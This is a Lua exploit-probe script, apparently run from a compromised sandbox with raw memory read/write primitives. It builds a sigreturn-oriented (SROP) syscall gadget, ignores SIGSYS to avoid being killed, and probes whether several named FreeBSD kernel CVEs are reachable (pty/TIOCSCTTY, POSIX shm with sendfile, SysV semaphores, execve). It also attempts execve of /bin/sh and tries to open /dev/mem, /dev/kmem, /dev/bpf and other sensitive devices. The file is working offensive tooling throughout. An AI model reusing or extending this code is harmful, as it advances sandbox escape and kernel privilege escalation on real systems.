-- CRASH_CLASS: MODERATE
-- PROBE 184a: Multi-CVE reachability test
--
-- Tests reachability for several new FreeBSD CVEs:
-- A) TIOCSCTTY race (CVE-2026-58093): needs pty/tty fd
-- B) posixshm largepage (CVE-2026-49427/49428): shm_open + sendfile
-- C) SysV semaphore wraparound (CVE-2026-58087): semget/semop
-- D) execve overflow (CVE-2026-7270): execve with crafted args
-- E) posix_openpt for pty allocation

print("=== 184a: NEW CVE REACHABILITY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end
local function rb(a) local ok,v = pcall(function() return memory.read_byte(a) end); if ok then return to_num(v) end; return nil end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- Ignore SIGSYS so nosys calls don't kill us
srop(416, uint64(12), uint64(1), uint64(0))

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x20000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

local function write_str(base, str)
    for i = 1, #str do
        wb(base + i - 1, string.byte(str, i))
    end
    wb(base + #str, 0)
end

-- === A: PTY/TTY ACCESS ===
print("")
print("--- A: PTY/TTY ACCESS ---")

-- Try opening /dev/ptmx (pty master multiplexer)
write_str(gpu + 0x100, "/dev/ptmx")
local rv = srop(5, ga(0x100), uint64(2))  -- O_RDWR
local ptmx = rv and to_num(rv) or -1
print("open(/dev/ptmx)=" .. ptmx)

-- Try posix_openpt (sys 504 on FreeBSD)
rv = srop(504, uint64(2))  -- O_RDWR
local popt = rv and to_num(rv) or -1
print("posix_openpt(O_RDWR)=" .. popt)

-- Try /dev/tty
write_str(gpu + 0x100, "/dev/tty")
rv = srop(5, ga(0x100), uint64(2))
local tty = rv and to_num(rv) or -1
print("open(/dev/tty)=" .. tty)

-- Try /dev/console
write_str(gpu + 0x100, "/dev/console")
rv = srop(5, ga(0x100), uint64(2))
local cons = rv and to_num(rv) or -1
print("open(/dev/console)=" .. cons)

-- Try /dev/null (baseline)
write_str(gpu + 0x100, "/dev/null")
rv = srop(5, ga(0x100), uint64(2))
local devnull = rv and to_num(rv) or -1
print("open(/dev/null)=" .. devnull)

-- If ptmx opened, try TIOCSCTTY
if ptmx >= 0 then
    print("!!! PTMX OPENED !!!")
    -- TIOCSCTTY = 0x20007461 on FreeBSD
    rv = srop(54, uint64(ptmx), uint64(0x20007461), uint64(0))
    print("ioctl(TIOCSCTTY)=" .. (rv and to_num(rv) or -999))
    srop(6, uint64(ptmx))
end
if popt >= 0 then
    print("!!! POSIX_OPENPT WORKS !!!")
    srop(6, uint64(popt))
end

-- === B: POSIX SHM ===
print("")
print("--- B: POSIX SHM ---")

-- shm_open (sys 482 on FreeBSD)
write_str(gpu + 0x200, "/test_shm")
-- O_CREAT|O_RDWR = 0x202
rv = srop(482, ga(0x200), uint64(0x202), uint64(0x1FF))  -- mode 0777
local shm = rv and to_num(rv) or -1
print("shm_open=" .. shm)

if shm >= 0 then
    print("!!! SHM_OPEN WORKS !!!")
    -- ftruncate to set size
    rv = srop(480, uint64(shm), uint64(0x4000))
    print("ftruncate=" .. (rv and to_num(rv) or -999))

    -- mmap the shm
    rv = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(shm), uint64(0))
    local smh, sml = 0, 0
    if rv then smh, sml = get_hi_lo(rv) end
    print("shm_mmap=" .. hex64(rv))

    -- Try sendfile (sys 393)
    -- Create a socket to send to
    local srv = srop(97, uint64(2), uint64(1), uint64(0))  -- AF_INET, STREAM
    print("sendfile_sock=" .. (srv and to_num(srv) or -1))

    -- sendfile(shm, sock, offset, nbytes, hdtr, sbytes, flags)
    -- SF_NOCACHE = 0x10
    if srv and to_num(srv) >= 0 then
        rv = srop(393, uint64(shm), uint64(to_num(srv)), uint64(0),
            uint64(0x1000), uint64(0), ga(0x300))
        print("sendfile(shm,sock)=" .. (rv and to_num(rv) or -999))

        -- With SF_NOCACHE
        rv = srop(393, uint64(shm), uint64(to_num(srv)), uint64(0),
            uint64(0x1000), uint64(0), ga(0x300), uint64(0x10))
        print("sendfile(SF_NOCACHE)=" .. (rv and to_num(rv) or -999))
        srop(6, uint64(to_num(srv)))
    end

    -- Try fspacectl (sys 580 on recent FreeBSD)
    -- fspacectl(fd, SPACECTL_DEALLOC=1, &rqsr, 0, &rmsr)
    -- struct spacectl_range: off + len (16 bytes)
    wd(gpu + 0x400, 0) -- offset low
    wd(gpu + 0x404, 0) -- offset high
    wd(gpu + 0x408, 0x4000) -- length low
    wd(gpu + 0x40C, 0) -- length high
    rv = srop(580, uint64(shm), uint64(1), ga(0x400), uint64(0), ga(0x410))
    print("fspacectl(DEALLOC)=" .. (rv and to_num(rv) or -999))

    -- O_TRUNC test: open existing with O_TRUNC
    rv = srop(482, ga(0x200), uint64(0x402), uint64(0x1FF))  -- O_RDWR|O_TRUNC
    print("shm_open(O_TRUNC)=" .. (rv and to_num(rv) or -999))
    if rv and to_num(rv) >= 0 then srop(6, uint64(to_num(rv))) end

    if smh ~= 0 or sml ~= 0 then
        srop(73, uint64(string.format("0x%X%08X", smh, sml)), uint64(0x4000))
    end
    srop(6, uint64(shm))

    -- shm_unlink
    srop(483, ga(0x200))
end

-- === C: SYSV SEMAPHORES ===
print("")
print("--- C: SYSV SEMAPHORES ---")

-- semget (sys 221): semget(key, nsems, semflg)
-- IPC_PRIVATE=0, IPC_CREAT=0x200
rv = srop(221, uint64(0), uint64(1), uint64(0x3FF))  -- IPC_PRIVATE, 1 sem, IPC_CREAT|0777
local semid = rv and to_num(rv) or -1
print("semget=" .. semid)

if semid >= 0 then
    print("!!! SEMGET WORKS !!!")

    -- semop (sys 222): semop(semid, sops, nsops)
    -- struct sembuf: sem_num(2), sem_op(2), sem_flg(2) = 6 bytes
    -- Post: sem_op = 1, sem_flg = IPC_NOWAIT (0x800)
    wd(gpu + 0x500, 0x00010000)  -- sem_num=0, sem_op=1
    wd(gpu + 0x504, 0x00000800)  -- sem_flg=IPC_NOWAIT
    rv = srop(222, uint64(semid), ga(0x500), uint64(1))
    print("semop(post)=" .. (rv and to_num(rv) or -999))

    -- semctl (sys 510): semctl(semid, semnum, cmd, ...)
    -- GETVAL = 5
    rv = srop(510, uint64(semid), uint64(0), uint64(5))
    print("semctl(GETVAL)=" .. (rv and to_num(rv) or -999))

    -- IPC_RMID = 0
    srop(510, uint64(semid), uint64(0), uint64(0))
end

-- Also try msgget (sys 225)
rv = srop(225, uint64(0), uint64(0x3FF))
print("msgget=" .. (rv and to_num(rv) or -1))

-- shmget (sys 231)
rv = srop(231, uint64(0), uint64(0x4000), uint64(0x3FF))
print("shmget=" .. (rv and to_num(rv) or -1))

-- === D: EXECVE TEST ===
print("")
print("--- D: EXECVE ---")
-- Just test if execve is reachable (it will fail with ENOENT or similar)
write_str(gpu + 0x600, "/nonexistent")
-- argv[0] = path, argv[1] = NULL
wq(gpu + 0x700, ga(0x600))
wq(gpu + 0x708, uint64(0))
-- envp[0] = NULL
wq(gpu + 0x710, uint64(0))

rv = srop(59, ga(0x600), ga(0x700), ga(0x710))
print("execve(/nonexistent)=" .. (rv and to_num(rv) or -999))

-- Try with /bin/sh
write_str(gpu + 0x600, "/bin/sh")
wq(gpu + 0x700, ga(0x600))
wq(gpu + 0x708, uint64(0))
rv = srop(59, ga(0x600), ga(0x700), ga(0x710))
print("execve(/bin/sh)=" .. (rv and to_num(rv) or -999))

-- === E: ADDITIONAL DEVICE ACCESS ===
print("")
print("--- E: ADDITIONAL DEVICES ---")

local devs = {"/dev/bpf", "/dev/bpf0", "/dev/urandom", "/dev/random",
              "/dev/pf", "/dev/crypto", "/dev/mem", "/dev/kmem"}
for _, d in ipairs(devs) do
    write_str(gpu + 0x100, d)
    rv = srop(5, ga(0x100), uint64(0))  -- O_RDONLY
    local fd = rv and to_num(rv) or -1
    if fd >= 0 then
        print(d .. "=" .. fd .. " !!!")
        srop(6, uint64(fd))
    end
end

-- Close any open fds
if devnull >= 0 then srop(6, uint64(devnull)) end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
